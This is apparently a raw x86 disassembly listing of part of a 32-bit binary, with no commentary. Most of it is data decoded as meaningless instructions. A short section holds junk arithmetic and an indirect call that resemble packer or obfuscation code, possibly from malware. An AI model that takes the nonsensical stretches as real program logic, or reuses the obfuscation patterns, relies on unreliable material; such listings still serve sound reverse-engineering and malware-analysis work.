  41e498:	xchg   esi,eax
  41e499:	xchg   ecx,eax
  41e49a:	or     esi,DWORD PTR [ebx+eax*2]
  41e49d:	mov    al,0x90
  41e49f:	inc    edi
  41e4a0:	push   ds
  41e4a1:	or     dl,bl
  41e4a3:	lds    edi,FWORD PTR [edx]
  41e4a5:	out    dx,eax
  41e4a6:	cld    
  41e4a7:	and    eax,0xa0294f04
  41e4ac:	jne    0x41e4d9
  41e4ae:	and    eax,0xf4684fd3
  41e4b3:	lahf   
  41e4b4:	adc    BYTE PTR [ecx+0x762b6174],ch
  41e4ba:	and    ah,BYTE PTR [ecx+0x1e]
  41e4bd:	push   edx
  41e4be:	and    cl,BYTE PTR [edx+0x30]
  41e4c1:	mov    WORD PTR [eax-0x7a89929a],ss
  41e4c7:	sahf   
  41e4c8:	les    esi,FWORD PTR [edx]
  41e4ca:	sbb    ah,BYTE PTR [esi+0x6f7b10ef]
  41e4d0:	bound  ebx,QWORD PTR [edx+eax*2-0x697fc64a]
  41e4d7:	mov    ecx,0xc8d1266c
  41e4dc:	sbb    ah,ch
  41e4de:	std    
  41e4df:	rol    BYTE PTR [eax],1
  41e4e1:	sbb    dh,al
  41e4e3:	jecxz  0x41e4bb
  41e4e5:	dec    esi
  41e4e6:	jb     0x41e479
  41e4e8:	dec    edx
  41e4e9:	loope  0x41e518
  41e4eb:	rcr    DWORD PTR [ebx+0x2],0xb2
  41e4ef:	or     eax,0x51289a82
  41e4f4:	retf   
  41e4f5:	ins    DWORD PTR es:[edi],dx
  41e4f6:	cmc    
  41e4f7:	out    dx,al
  41e4f8:	(bad)  
  41e4f9:	lods   al,BYTE PTR ds:[esi]
  41e4fa:	repz aam 0xca
  41e4fd:	sar    bh,cl
  41e4ff:	fmul   DWORD PTR [ebp+0x24]
  41e502:	cmp    cl,BYTE PTR [edx+edi*2-0x6b5e730d]
  41e509:	sub    bh,0x61
  41e50c:	push   0x4ae42800
  41e511:	lds    edx,FWORD PTR [edi]
  41e513:	mov    dl,0x51
  41e515:	inc    esp
  41e516:	sbb    DWORD PTR [esi+esi*4-0x15c74e66],ecx
  41e51d:	push   ss
  41e51e:	imul   DWORD PTR [esi+0x3e]
  41e521:	adc    al,0x20
  41e523:	push   eax
  41e524:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e525:	sahf   
  41e526:	and    bl,dh
  41e528:	ins    DWORD PTR es:[edi],dx
  41e529:	stos   BYTE PTR es:[edi],al
  41e52a:	nop
  41e52b:	frstor [edx-0x71b0f7f9]
  41e531:	shl    BYTE PTR [edx],1
  41e533:	sub    al,ah
  41e535:	int    0x66
  41e537:	and    BYTE PTR [ecx-0x4],dl
  41e53a:	mov    bl,0xc4
  41e53c:	or     eax,edx
  41e53e:	out    dx,eax
  41e53f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e540:	jns    0x41e587
  41e542:	shl    DWORD PTR [esi-0x244e3baf],cl
  41e548:	inc    eax
  41e549:	dec    eax
  41e54a:	call   0x9c9cfbfb
  41e54f:	push   ds
  41e550:	xor    bl,BYTE PTR cs:[eax+eax*2]
  41e554:	test   al,0x89
  41e556:	xchg   esp,eax
  41e557:	sbb    DWORD PTR [esi-0x2d3eac58],eax
  41e55d:	push   ebp
  41e55e:	push   0x41
  41e560:	scas   al,BYTE PTR es:[edi]
  41e561:	(bad)  
  41e562:	mov    ds:0xa1d337c7,al
  41e567:	pop    ebx
  41e568:	adc    edx,edi
  41e56a:	popf   
  41e56b:	mov    bl,0x3e
  41e56d:	mov    ecx,0x5dbdc1f2
  41e572:	pop    ecx
  41e573:	fmul   st(1),st
  41e575:	mov    bl,0xe6
  41e577:	fdivr  DWORD PTR es:[esi]
  41e57a:	mov    WORD PTR [eax-0x5c25c736],es
  41e580:	pop    ebp
  41e581:	xor    cl,ah
  41e583:	pop    ebx
  41e584:	aam    0x71
  41e586:	jmp    0x41e538
  41e588:	out    dx,eax
  41e589:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e58a:	addr16 int3 
  41e58c:	dec    esp
  41e58d:	cli    
  41e58e:	lock sub DWORD PTR [edi+ecx*1+0xe],ebp
  41e593:	xchg   esi,eax
  41e594:	imul   eax,DWORD PTR [esi-0x7ac94d1b],0x1daa14b0
  41e59e:	or     eax,0xe0117cd9
  41e5a3:	addr16 in eax,0x9c
  41e5a6:	in     al,dx
  41e5a7:	ins    DWORD PTR es:[edi],dx
  41e5a8:	ret    0xda72
  41e5ab:	push   ebp
  41e5ac:	mov    BYTE PTR [ecx],dl
  41e5ae:	push   ds
  41e5af:	shl    eax,0x2
  41e5b2:	or     eax,ecx
  41e5b4:	jmp    0x41e983
  41e5b9:	test   BYTE PTR [esi],cl
  41e5bb:	nop
  41e5bc:	lahf   
  41e5bd:	jp     0x41e5dd
  41e5bf:	and    ch,BYTE PTR [edx]
  41e5c1:	xor    eax,0xc0aae715
  41e5c6:	jns    0x41e57b
  41e5c8:	jl     0x41e635
  41e5ca:	aaa    
  41e5cb:	push   ss
  41e5cc:	sbb    BYTE PTR [edx+edx*1+0x60df1818],bh
  41e5d3:	and    al,0x60
  41e5d6:	outs   dx,DWORD PTR ds:[esi]
  41e5d7:	(bad)
  41e5da:	pop    sp
  41e5dc:	sahf   
  41e5dd:	cs into 
  41e5df:	call   0x9b16b660
  41e5e4:	jmp    0xe7dfcb36
  41e5e9:	mov    dl,0x4f
  41e5eb:	aam    0xd4
  41e5ed:	dec    edi
  41e5ee:	scas   eax,DWORD PTR es:[edi]
  41e5ef:	je     0x41e57e
  41e5f1:	leave  
  41e5f2:	mov    bl,0x35
  41e5f4:	pop    ecx
  41e5f5:	rcl    BYTE PTR [esi+0x18],0xeb
  41e5f9:	xchg   esp,eax
  41e5fa:	pop    edx
  41e5fb:	mov    cl,0xe
  41e5fd:	adc    eax,0x76cf9d6b
  41e602:	stos   BYTE PTR es:[edi],al
  41e603:	fist   DWORD PTR [ebp-0x11]
  41e606:	and    al,0x9a
  41e608:	(bad)  
  41e609:	mov    eax,ds:0xaf1f9bcc
  41e60e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e60f:	inc    edi
  41e610:	mov    DWORD PTR cs:[ecx+0x57],esi
  41e614:	dec    esi
  41e615:	pop    esi
  41e616:	and    ebp,esp
  41e618:	aas    
  41e619:	into   
  41e61a:	jmp    0x41e5d3
  41e61c:	dec    edx
  41e61d:	push   esi
  41e61e:	out    0xf7,al
  41e620:	pop    ds
  41e621:	sub    BYTE PTR ss:[esi+0x240ba2a4],cl
  41e628:	icebp  
  41e629:	jae    0x41e637
  41e62b:	pop    eax
  41e62c:	lock in eax,0xf0
  41e62f:	sub    DWORD PTR [eax],edi
  41e631:	leave  
  41e632:	mov    esi,DWORD PTR [edx-0x6a5bc12f]
  41e638:	sub    bh,bl
  41e63a:	sbb    dh,BYTE PTR [ecx-0x248cfe68]
  41e640:	adc    dh,dl
  41e642:	add    eax,0x4794d4cf
  41e647:	lods   eax,DWORD PTR ds:[esi]
  41e648:	mov    al,ds:0x8d180ca9
  41e64d:	jl     0x41e617
  41e64f:	mov    bl,0x7
  41e651:	retfw  
  41e653:	sbb    al,0x69
  41e655:	(bad)  
  41e656:	call   0xb20a5934
  41e65b:	mov    bl,0xd8
  41e65d:	nop
  41e65e:	cmc    
  41e65f:	jge    0x41e65b
  41e661:	mov    ch,0x88
  41e663:	and    edx,DWORD PTR [ecx]
  41e665:	push   ecx
  41e666:	jge    0x41e5ec
  41e668:	dec    esp
  41e669:	out    dx,eax
  41e66a:	xor    eax,DWORD PTR [ebx+ebp*4]
  41e66d:	jp     0x41e69b
  41e66f:	adc    edx,DWORD PTR [esi+0x49]
  41e672:	ret    
  41e673:	push   0x59
  41e675:	stc    
  41e676:	xchg   ecx,eax
  41e677:	(bad)  
  41e678:	lds    ebx,FWORD PTR [ebx-0x3b]
  41e67b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e67c:	sub    ebx,DWORD PTR [esp+esi*2+0x55d2ff8a]
  41e683:	stos   BYTE PTR es:[edi],al
  41e684:	scas   al,BYTE PTR es:[edi]
  41e685:	xadd   BYTE PTR [esp+esi*4],bh
  41e689:	pop    es
  41e68a:	xor    edx,DWORD PTR [esi+0x30ca71b8]
  41e690:	cld    
  41e691:	jp     0x41e67b
  41e693:	mov    cl,0x5f
  41e695:	mov    ds:0x4fe7ac52,al
  41e69a:	not    DWORD PTR [esi+0x34]
  41e69d:	sub    eax,0x192c1554
  41e6a3:	xchg   edi,eax
  41e6a4:	mov    eax,DWORD PTR [ebx+0x25b628d6]
  41e6aa:	gs das 
  41e6ac:	and    bh,al
  41e6ae:	or     eax,0xbe033633
  41e6b3:	nop
  41e6b4:	sub    ch,BYTE PTR [esi-0x18]
  41e6b7:	lahf   
  41e6b8:	jmp    0x3b38667
  41e6bd:	fld    DWORD PTR [ebx+edx*1]
  41e6c0:	leave  
  41e6c1:	jbe    0x41e724
  41e6c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e6c4:	sbb    edx,ecx
  41e6c6:	int3   
  41e6c7:	hlt    
  41e6c8:	loop   0x41e71f
  41e6ca:	xchg   DWORD PTR [ebx+ebp*2+0x73982338],ebx
  41e6d1:	mov    cl,0x66
  41e6d3:	inc    esi
  41e6d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e6d5:	sahf   
  41e6d6:	xchg   edx,eax
  41e6d7:	adc    bl,BYTE PTR [eax]
  41e6d9:	dec    edi
  41e6da:	dec    esi
  41e6db:	les    ebx,FWORD PTR [edx]
  41e6dd:	pop    esi
  41e6de:	push   ebx
  41e6df:	aad    0x8c
  41e6e1:	addr16 jmp 0xe440:0xba446ef8
  41e6e9:	pushf  
  41e6ea:	imul   esi,DWORD PTR [ebp-0x690d9671],0xce2881d6
  41e6f4:	or     dh,BYTE PTR [eax+edi*2-0x55]
  41e6f8:	out    0xad,al
  41e6fa:	xor    DWORD PTR [edi-0x5],ebp
  41e6fd:	repz jnp 0x41e762
  41e700:	mov    ebx,0x557148a4
  41e705:	loopne 0x41e716
  41e707:	setno  BYTE PTR [ebp+0x9b1d1ac]
  41e70e:	ret    
  41e70f:	lahf   
  41e710:	loopne 0x41e6d4
  41e712:	cwde   
  41e713:	frstor [ebx-0x72]
  41e716:	jnp    0x41e728
  41e718:	daa    
  41e719:	and    eax,DWORD PTR [ebp-0x2cc2d2e3]
  41e71f:	and    esp,DWORD PTR [edi-0x493db530]
  41e725:	(bad)  
  41e726:	mov    ds:0x61fc82dd,al
  41e72b:	jmp    0xaf84b606
  41e730:	pop    ebx
  41e731:	ins    DWORD PTR es:[edi],dx
  41e732:	(bad)  
  41e733:	in     eax,dx
  41e734:	imul   edi,eax,0xffffff90
  41e737:	inc    esp
  41e738:	dec    ebp
  41e739:	cdq    
  41e73a:	in     al,0x1c
  41e73c:	mov    bh,0x8c
  41e73e:	fsub   st,st(3)
  41e740:	jecxz  0x41e6fe
  41e742:	lock adc al,0x10
  41e745:	(bad)  
  41e746:	mov    eax,ds:0x29c13aa8
  41e74b:	imul   esi,DWORD PTR [ebx],0xd78d3990
  41e751:	inc    ebx
  41e752:	pop    ds
  41e753:	sahf   
  41e754:	into   
  41e755:	sbb    BYTE PTR [eax-0x20],0x3c
  41e759:	leave  
  41e75a:	lahf   
  41e75b:	stos   DWORD PTR es:[edi],eax
  41e75c:	stos   BYTE PTR es:[edi],al
  41e75d:	sbb    bh,ch
  41e75f:	cli    
  41e760:	inc    eax
  41e761:	imul   esp,DWORD PTR [edx-0x76],0x3b
  41e765:	jle    0x41e745
  41e767:	pushf  
  41e768:	jl     0x41e718
  41e76a:	add    eax,DWORD PTR [edx+0x1c]
  41e76d:	mov    ch,0x3b
  41e76f:	pushf  
  41e770:	adc    ecx,DWORD PTR [ecx-0x7d]
  41e773:	dec    edx
  41e774:	out    0x2,eax
  41e776:	je     0x41e751
  41e778:	fst    st(6)
  41e77a:	jne    0x41e7ec
  41e77c:	js     0x41e70a
  41e77e:	stc    
  41e77f:	fild   WORD PTR [ebp+0x20]
  41e782:	or     eax,0x29a1706f
  41e787:	int    0x27
  41e789:	pop    eax
  41e78a:	cmp    DWORD PTR [ebx+eax*4-0x118b40b6],edx
  41e791:	or     DWORD PTR [edx+0xea149e1],ebp
  41e797:	(bad)  [edx+0x5960548e]
  41e79d:	sar    dh,cl
  41e79f:	sub    al,0xdc
  41e7a1:	int3   
  41e7a2:	mov    edi,0x7088d862
  41e7a7:	jmp    0x4658:0x5c6a0244
  41e7ae:	cmp    al,0x28
  41e7b0:	lock ja 0x41e7ea
  41e7b3:	ja     0x41e7f5
  41e7b5:	retf   0xa6ab
  41e7b8:	adc    al,BYTE PTR [eax-0x41]
  41e7bb:	aaa    
  41e7bc:	mov    ch,0x49
  41e7be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e7bf:	icebp  
  41e7c0:	mov    BYTE PTR [ebp+0x7642cea9],ah
  41e7c6:	mov    dl,al
  41e7c8:	stos   BYTE PTR es:[edi],al
  41e7c9:	cmp    ch,cl
  41e7cb:	leave  
  41e7cc:	or     edx,esi
  41e7ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e7cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e7d0:	sbb    eax,0xc0fbbca6
  41e7d5:	mov    dh,BYTE PTR [ecx]
  41e7d7:	fdiv   QWORD PTR [edi]
  41e7d9:	xlat   BYTE PTR ds:[ebx]
  41e7da:	cmp    ebp,DWORD PTR [eax-0x45048961]
  41e7e0:	cmp    ebp,DWORD PTR [ecx-0x2]
  41e7e3:	in     al,0x2c
  41e7e5:	daa    
  41e7e6:	xor    al,0x7c
  41e7e8:	mov    bh,0x80
  41e7ea:	xchg   ebx,eax
  41e7eb:	and    eax,0x107c877e
  41e7f0:	dec    edx
  41e7f1:	addr16 popa 
  41e7f3:	or     BYTE PTR es:[ebx+0x6526944f],ch
  41e7fa:	stc    
  41e7fb:	cld    
  41e7fc:	call   0x3b19:0x984d09ef
  41e803:	pop    ss
  41e804:	adc    dh,BYTE PTR [edi+0x333bb129]
  41e80a:	xor    ah,BYTE PTR [esi-0x6b]
  41e80d:	ss jns 0x41e85e
  41e810:	lock jle 0x41e7c6
  41e813:	inc    eax
  41e814:	mov    ch,0x40
  41e816:	test   al,0xbe
  41e818:	aaa    
  41e819:	std    
  41e81a:	push   ds
  41e81b:	sbb    al,ah
  41e81d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e81e:	cwde   
  41e81f:	sbb    eax,0xa2819738
  41e824:	sbb    al,0xa7
  41e826:	xchg   edx,eax
  41e827:	xchg   esi,eax
  41e828:	xlat   BYTE PTR ds:[ebx]
  41e829:	data16 sub BYTE PTR [esi-0x73],dh
  41e82d:	mov    eax,ecx
  41e82f:	jmp    0x1731:0x5aad867d
  41e836:	js     0x41e89f
  41e838:	into   
  41e839:	mov    edi,0x26668731
  41e83e:	loop   0x41e84b
  41e840:	rol    BYTE PTR [ebp+0x498f0127],0xd5
  41e847:	cs aaa 
  41e849:	(bad)  
  41e84a:	ss stc 
  41e84c:	sbb    eax,0x3481b8ba
  41e851:	adc    BYTE PTR [ebp-0xa],al
  41e854:	addr16 idiv eax
  41e857:	and    eax,0x87d1c6c3
  41e85c:	jbe    0x41e85e
  41e85e:	daa    
  41e85f:	loopne 0x41e7f4
  41e861:	and    al,0x5c
  41e863:	ret    0x71af
  41e866:	out    dx,al
  41e867:	repz fcmovnb st,st(2)
  41e86a:	(bad)  
  41e86b:	mov    al,ds:0xb18774e2
  41e870:	add    ch,BYTE PTR ds:0x61d1af4b
  41e876:	mov    eax,ds:0x7eff6be8
  41e87b:	popf   
  41e87c:	xchg   ecx,eax
  41e87d:	ret    0x83a5
  41e880:	xor    eax,0x56fd6e86
  41e885:	mov    dh,0xd4
  41e887:	hlt    
  41e888:	sub    edx,edx
  41e88a:	call   0x5ca5:0x7b7eade2
  41e891:	jp     0x41e820
  41e893:	cdq    
  41e894:	fidivr WORD PTR [edi-0xc]
  41e897:	mov    edx,0xb96cee0c
  41e89c:	xchg   edx,eax
  41e89d:	clc    
  41e89e:	jb     0x41e881
  41e8a0:	dec    eax
  41e8a1:	sar    BYTE PTR [edi+edi*1-0x22],1
  41e8a5:	imul   ebx,ebp,0x479a119c
  41e8ab:	push   cs
  41e8ac:	std    
  41e8ad:	inc    esi
  41e8ae:	inc    ecx
  41e8af:	jns    0x41e899
  41e8b1:	test   DWORD PTR [edi+ebp*8-0x4cd4096],ebx
  41e8b8:	cmp    ebp,DWORD PTR ds:0x47c57c1
  41e8be:	add    dh,ah
  41e8c0:	aaa    
  41e8c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e8c2:	pop    ss
  41e8c3:	jb     0x41e8ec
  41e8c5:	dec    ecx
  41e8c6:	sar    cl,0xcc
  41e8c9:	aas    
  41e8ca:	or     dh,BYTE PTR [ecx-0x53]
  41e8cd:	pop    esi
  41e8ce:	and    DWORD PTR [eax+0x8],edi
  41e8d1:	in     eax,dx
  41e8d2:	cmp    eax,0xc756b0dc
  41e8d7:	aad    0x30
  41e8d9:	test   al,0x73
  41e8db:	xchg   BYTE PTR [eax+0x5ea7ddd5],al
  41e8e1:	push   ebp
  41e8e2:	xlat   BYTE PTR ds:[ebx]
  41e8e3:	xchg   edx,eax
  41e8e4:	repz out 0x4,eax
  41e8e7:	lock add ebp,eax
  41e8ea:	mov    ah,0x2b
  41e8ec:	ror    BYTE PTR [ebp+0x3a],0xf
  41e8f0:	call   0xda5e750b
  41e8f5:	mov    dh,0xd6
  41e8f7:	lods   eax,DWORD PTR ds:[esi]
  41e8f8:	mov    WORD PTR [edx],fs
  41e8fa:	fisttp QWORD PTR [eax]
  41e8fc:	enter  0x5fcb,0x21
  41e900:	sub    BYTE PTR [eax],cl
  41e902:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  41e904:	and    DWORD PTR [ebx+0x3f03f04a],0x12
  41e90b:	push   ebx
  41e90c:	sar    DWORD PTR [ebx+0x19aa94d7],cl
  41e912:	fild   QWORD PTR [edi-0x2ff9ff59]
  41e918:	in     al,0xe
  41e91a:	in     al,0x1b
  41e91c:	jg     0x41e8cb
  41e91e:	aaa    
  41e91f:	rol    BYTE PTR [edi],0xe6
  41e922:	pop    ds
  41e923:	push   esi
  41e924:	outs   dx,BYTE PTR ds:[esi]
  41e925:	jmp    0x41e8c2
  41e927:	into   
  41e928:	retf   0x7734
  41e92b:	xor    DWORD PTR [ebx+0x6e7490df],edi
  41e931:	sbb    ebx,edx
  41e933:	inc    edi
  41e934:	jmp    eax
  41e936:	stos   DWORD PTR es:[edi],eax
  41e937:	cmc    
  41e938:	sti    
  41e939:	cli    
  41e93a:	inc    BYTE PTR [edx+eiz*2]
  41e93d:	fnstenv [edx+eax*1]
  41e940:	shl    DWORD PTR [ebp+0x52],cl
  41e943:	push   esp
  41e944:	loope  0x41e8db
  41e946:	imul   DWORD PTR [eax+0x5adb1939]
  41e94c:	cmp    eax,edi
  41e94e:	and    al,0x1d
  41e950:	sbb    eax,0xd32029f1
  41e955:	jae    0x41e93d
  41e957:	sar    BYTE PTR [edi-0x3a14c277],cl
  41e95d:	mov    dh,0x7e
  41e95f:	mov    dl,0x32
  41e961:	jne    0x41e9dc
  41e963:	inc    ebx
  41e964:	cmp    eax,0x7e483166
  41e969:	pop    eax
  41e96a:	xchg   edi,eax
  41e96b:	add    eax,0x56deacc1
  41e970:	test   DWORD PTR [ecx-0x5310a6dd],eax
  41e976:	mov    dl,0x5f
  41e978:	sbb    DWORD PTR [esi+0x44],edi
  41e97b:	rol    BYTE PTR [eax+0x39],cl
  41e97e:	imul   ebx,edx,0xb9ac333
  41e984:	xlat   BYTE PTR ds:[ebx]
  41e985:	mov    ecx,edx
  41e987:	mov    edx,DWORD PTR [esp+0x18]
  41e98b:	xor    eax,ebx
  41e98d:	xor    ecx,esi
  41e98f:	mov    esi,DWORD PTR [esp+0x1c]
  41e993:	cmp    edx,eax
  41e995:	jne    0x41e9a3
  41e99b:	cmp    esi,ecx
  41e99d:	je     0x41e9ea
  41e9a3:	push   DWORD PTR ds:0x422698
  41e9a9:	push   DWORD PTR ds:0x42242c
  41e9af:	mov    eax,ds:0x4225a8
  41e9b4:	mov    eax,DWORD PTR [eax+0x1a4]
  41e9ba:	push   DWORD PTR [eax]
  41e9bc:	mov    eax,DWORD PTR [esp+0x78]
  41e9c0:	call   eax
  41e9c2:	mov    ecx,DWORD PTR ds:0x4225a8
  41e9c8:	mov    ecx,DWORD PTR [ecx+0x1dc]
  41e9ce:	mov    DWORD PTR [ecx],eax
  41e9d0:	mov    eax,ds:0x4225a8
  41e9d5:	push   0x4
  41e9d7:	add    eax,0x1dc
  41e9dc:	push   eax
  41e9dd:	lea    eax,[esp+0x84]
  41e9e4:	push   eax
  41e9e5:	call   0x415231
  41e9ea:	mov    eax,DWORD PTR [esp+0x7c]
  41e9ee:	mov    eax,DWORD PTR [eax]
  41e9f0:	pop    edi
  41e9f1:	pop    esi
  41e9f2:	pop    ebx
  41e9f3:	mov    esp,ebp
  41e9f5:	pop    ebp
  41e9f6:	ret    0xc
  41e9f9:	push   ebp
  41e9fa:	mov    ebp,esp
  41e9fc:	sub    esp,0x23c
  41ea02:	or     ecx,eax
  41ea04:	push   ebx
  41ea05:	cmp    DWORD PTR ds:0x4282b7,0x0
  41ea0c:	mov    DWORD PTR ds:0x4283c3,0x7749
  41ea16:	mov    DWORD PTR ds:0x4281c3,ebx
  41ea1c:	mov    DWORD PTR ds:0x428363,edx
  41ea22:	mov    DWORD PTR ds:0x428363,0xc7b
  41ea2c:	jmp    0x41ea8e
  41ea31:	mov    DWORD PTR ds:0x4282db,edx
  41ea37:	cmp    DWORD PTR ds:0x4282b7,0x0
  41ea3e:	jg     0x41ea74
  41ea44:	push   0x2154
  41ea49:	push   0x5063
  41ea4e:	call   DWORD PTR ds:0x428e64
  41ea54:	sbb    DWORD PTR ds:0x4283bf,ecx
  41ea5a:	mov    ecx,DWORD PTR ds:0x42836b
  41ea60:	xor    ecx,DWORD PTR ds:0x428357
  41ea66:	mov    DWORD PTR ds:0x42836b,ecx
  41ea6c:	sbb    ecx,0x6e15
  41ea72:	neg    ecx
  41ea74:	xor    DWORD PTR ds:0x428293,ecx
  41ea7a:	adc    ecx,DWORD PTR ds:0x4281e7
  41ea80:	mov    ecx,DWORD PTR ds:0x428233
  41ea86:	mov    ecx,DWORD PTR [ecx]
  41ea88:	and    DWORD PTR ds:0x4281d7,ecx
  41ea8e:	push   esi
  41ea8f:	mov    ecx,DWORD PTR ds:0x428247
  41ea95:	mov    eax,ds:0x428333
  41ea9a:	sub    eax,ecx
  41ea9c:	imul   ecx,DWORD PTR [ecx+eax*1]
  41eaa0:	push   edi
  41eaa1:	add    DWORD PTR ds:0x4282ab,ebx
  41eaa7:	mov    DWORD PTR [ebp-0x50],0x1
  41eaae:	sub    DWORD PTR ds:0x4282db,edi
  41eab4:	mov    DWORD PTR [ebp-0xbc],0x61a1
  41eabe:	xor    DWORD PTR ds:0x42836b,0x437e
  41eac8:	mov    DWORD PTR [ebp-0xb8],0x1
  41ead2:	mov    ecx,DWORD PTR [ebp-0xb8]
  41ead8:	add    eax,0x2e28
  41eadd:	mov    eax,0x584
  41eae2:	xor    edx,edx
  41eae4:	sbb    DWORD PTR ds:0x4283e7,0x42833f
  41eaee:	div    ecx
  41eaf0:	xor    ecx,0x2352
  41eaf6:	imul   eax,eax,0x51d4
  41eafc:	neg    ecx
  41eafe:	mov    ecx,DWORD PTR [ebp-0xbc]
  41eb04:	or     DWORD PTR ds:0x4283d3,0x4283e3
  41eb0e:	xor    eax,ecx
  41eb10:	and    eax,0x4c09
  41eb15:	xor    ecx,DWORD PTR ds:0x428353
  41eb1b:	mov    ecx,DWORD PTR [ebp-0x50]
  41eb1e:	xor    edx,edx
  41eb20:	and    DWORD PTR ds:0x4282ab,0x4281df
  41eb2a:	div    ecx
  41eb2c:	or     DWORD PTR ds:0x4283f7,0x3423
  41eb36:	sub    eax,0x401
  41eb3b:	cmp    DWORD PTR ds:0x428377,0x0
  41eb42:	mov    DWORD PTR ds:0x4283e7,edx
  41eb48:	mov    DWORD PTR ds:0x428287,ebx
  41eb4e:	not    DWORD PTR ds:0x428283
  41eb54:	jmp    0x41ebb2
  41eb59:	mov    DWORD PTR ds:0x42827b,0x3ca0
  41eb63:	not    DWORD PTR ds:0x428367
  41eb69:	cmp    DWORD PTR ds:0x428377,0x0
  41eb70:	je     0x41eba0
  41eb76:	push   DWORD PTR [ebp-0x10]
  41eb79:	push   0x4da1
  41eb7e:	push   0x1144
  41eb83:	push   DWORD PTR [ebp-0x18]
  41eb86:	call   DWORD PTR ds:0x428e68
  41eb8c:	add    edx,0x1800
  41eb92:	add    edx,DWORD PTR ds:0x4283df
  41eb98:	sub    ecx,ecx
  41eb9a:	adc    ecx,0x47f1
  41eba0:	sub    edx,edx
  41eba2:	mov    DWORD PTR ds:0x4283e7,0x44a4
  41ebac:	and    ecx,DWORD PTR ds:0x42827f
  41ebb2:	mov    DWORD PTR [ebp-0x90],eax
  41ebb8:	mov    eax,ds:0x428313
  41ebbd:	mov    eax,DWORD PTR [eax]
  41ebbf:	sbb    DWORD PTR ds:0x4283e3,eax
  41ebc5:	mov    DWORD PTR [ebp-0x8c],0x2ff8
  41ebcf:	add    DWORD PTR ds:0x4281ab,0x4282f7
  41ebd9:	mov    DWORD PTR [ebp-0x4c],0x39f7
  41ebe0:	xor    DWORD PTR ds:0x42829f,edx
  41ebe6:	mov    DWORD PTR [ebp-0xb4],0x3842
  41ebf0:	or     edx,ecx
  41ebf2:	jmp    0x41ef4e
  41ebf7:	ret    0x8bf6
  41ebfa:	push   ebx
  41ebfb:	sbb    ch,BYTE PTR [ebx]
  41ebfd:	mov    edx,0x71125f66
  41ec02:	mov    al,0x23
  41ec04:	xor    eax,0x2f0ebe2b
  41ec09:	push   ss
  41ec0a:	sbb    BYTE PTR [ebx-0x66e7e7ee],ah
  41ec10:	imul   esp,DWORD PTR [edx-0xa],0x2a
  41ec14:	(bad)  [ebx]
  41ec16:	push   0xd404ee15
  41ec1b:	jl     0x41ec91
  41ec1d:	popf   
  41ec1e:	fdivr  st,st(1)
  41ec20:	jmp    0x41ebc6
  41ec22:	jecxz  0x41ebb0
  41ec24:	enter  0xbe92,0xa8
  41ec28:	test   al,0x82
  41ec2a:	(bad)  [edx+0x65]
  41ec2d:	cmp    dl,cl
  41ec2f:	ins    DWORD PTR es:[edi],dx
  41ec30:	xchg   BYTE PTR [esp+edi*1],ah
  41ec33:	mov    eax,esi
  41ec35:	mov    edx,0x9148064c
  41ec3a:	push   ecx
  41ec3b:	out    0x1a,al
  41ec3d:	(bad)  
  41ec3e:	cmp    esp,DWORD PTR [ecx-0x5ca232f2]
  41ec44:	mov    ebp,0x56b0964f
  41ec49:	hlt    
  41ec4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec4b:	aad    0xdf
  41ec4d:	ins    DWORD PTR es:[edi],dx
  41ec4e:	add    DWORD PTR [edx-0x26],eax
  41ec51:	and    DWORD PTR [edi+0x29],ebp
  41ec54:	cmp    cl,bh
  41ec56:	inc    eax
  41ec57:	mov    cl,0xe0
  41ec59:	call   0xc3807c14
  41ec5e:	repnz popf 
  41ec60:	dec    eax
  41ec61:	ja     0x41ecc1
  41ec63:	cmp    DWORD PTR [esi+0x50545433],ecx
  41ec69:	test   DWORD PTR [ebp-0x57d1ca5a],edx
  41ec6f:	add    BYTE PTR [esi],cl
  41ec71:	adc    DWORD PTR [edx],esi
  41ec73:	loopne 0x41ec98
  41ec75:	jno    0x41ece8
  41ec77:	push   edi
  41ec78:	push   ds
  41ec79:	sub    al,0xa7
  41ec7b:	iret   
  41ec7c:	pushf  
  41ec7d:	jge    0x41ec24
  41ec7f:	sbb    eax,0x81388aae
  41ec84:	test   eax,0x27d40f61
  41ec89:	mov    ch,0x1f
  41ec8b:	mov    edx,0x5f3de1fe
  41ec90:	out    dx,al
  41ec91:	fadd   QWORD PTR [eax]
  41ec93:	rcl    BYTE PTR [eax],1
  41ec95:	xchg   BYTE PTR [edx+0x119074ea],bh
  41ec9b:	jnp    0x41ecb6
  41ec9d:	sbb    esp,esi
  41ec9f:	push   ebp
  41eca0:	sub    al,0xe5
  41eca2:	push   ebp
  41eca3:	cmc    
  41eca4:	adc    eax,DWORD PTR [ecx]
  41eca6:	mov    edi,0x6d683574
  41ecab:	jl     0x41ec57
  41ecad:	jmp    0x6d4b:0x3b8072a
  41ecb4:	jge    0x41ecc4
  41ecb6:	sahf   
  41ecb7:	mov    ebx,DWORD PTR [ebp+0xac5346d]
  41ecbd:	push   esp
  41ecbe:	lea    edx,[ecx+0x7]
  41ecc1:	push   ds
  41ecc2:	xor    BYTE PTR [ecx],dh
  41ecc4:	cld    
  41ecc5:	(bad)  
  41ecc6:	sbb    al,0x33
  41ecc8:	pop    edi
  41ecc9:	popf   
  41ecca:	inc    esi
  41eccb:	mov    al,0xba
  41eccd:	mov    eax,0xbcd6eec0
  41ecd3:	lea    esp,[ecx-0x4d]
  41ecd6:	xor    esp,DWORD PTR [ecx+0xaad52d4]
  41ecdc:	outs   dx,DWORD PTR ds:[esi]
  41ecdd:	jl     0x41ed09
  41ecdf:	mov    bh,0x9
  41ece1:	(bad)  
  41ece2:	les    edi,FWORD PTR [esi]
  41ece4:	jp     0x41ed5d
  41ece6:	loop   0x41ecaf
  41ece8:	pop    ecx
  41ece9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
